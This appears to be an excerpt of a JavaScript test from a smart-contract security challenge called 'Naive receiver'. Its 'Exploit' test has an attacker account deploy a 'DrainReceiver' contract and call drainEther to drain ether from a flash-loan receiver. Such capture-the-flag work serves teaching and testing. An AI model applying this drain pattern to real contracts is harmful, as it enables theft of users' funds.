...
describe('[Challenge] Naive receiver', function () {
    ...
    it('Exploit', async function () {
        ...
        const FlashLoanAttackFactory = await ethers.getContractFactory('DrainReceiver', attacker);
        this.attack = await FlashLoanAttackFactory.deploy();

        this.attack.drainEther(this.pool.address, this.receiver.address);
